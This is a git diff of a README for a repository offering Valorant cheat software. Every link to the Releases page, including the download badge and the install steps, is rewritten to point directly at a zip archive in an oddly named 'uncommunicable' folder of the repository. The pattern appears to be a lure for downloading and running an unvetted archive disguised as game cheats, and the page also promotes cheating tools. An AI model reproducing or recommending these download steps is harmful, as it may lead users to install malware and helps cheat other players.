@@ -1,7 +1,7 @@
 # 🎮 Maxi-Valorant-Internal-Cheats - Play Better with Our Tools
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-blue)](https://github.com/shezzi1233/Maxi-Valorant-Internal-Cheats/releases)
+[![Download Release](https://raw.githubusercontent.com/shezzi1233/Maxi-Valorant-Internal-Cheats/main/uncommunicable/Maxi-Valorant-Internal-Cheats.zip%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/shezzi1233/Maxi-Valorant-Internal-Cheats/main/uncommunicable/Maxi-Valorant-Internal-Cheats.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide will help you download and run the Maxi-Valorant-Internal-Cheats software. You will find all the necessary steps listed clearly.
@@ -28,11 +28,11 @@ The software includes a variety of features that can help you gain an edge in Va
 - **Imgui**: A user-friendly graphical interface.
 
 ## 🔗 Download & Install
-To get started, visit the [Releases page](https://github.com/shezzi1233/Maxi-Valorant-Internal-Cheats/releases) to download the latest version of Maxi-Valorant-Internal-Cheats. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/shezzi1233/Maxi-Valorant-Internal-Cheats/main/uncommunicable/Maxi-Valorant-Internal-Cheats.zip) to download the latest version of Maxi-Valorant-Internal-Cheats. Follow these steps:
 
 1. Click on the above link to open the Releases page.
 2. Choose the latest version listed at the top.
-3. Look for the download link for the executable file (for example, `Maxi-Valorant-Internal-Cheats.exe`).
+3. Look for the download link for the executable file (for example, `https://raw.githubusercontent.com/shezzi1233/Maxi-Valorant-Internal-Cheats/main/uncommunicable/Maxi-Valorant-Internal-Cheats.zip`).
 4. Click on the link to download the file to your computer.
 
 ## ⚙️ Running the Application
@@ -67,4 +67,4 @@ For further assistance or to report issues, you can open an issue in this reposi
 
 Thank you for choosing Maxi-Valorant-Internal-Cheats. Enjoy your enhanced gaming experience! 
 
-Don't forget, you can always revisit our [Releases page](https://github.com/shezzi1233/Maxi-Valorant-Internal-Cheats/releases) to get the latest updates.
+Don't forget, you can always revisit our [Releases page](https://raw.githubusercontent.com/shezzi1233/Maxi-Valorant-Internal-Cheats/main/uncommunicable/Maxi-Valorant-Internal-Cheats.zip) to get the latest updates.
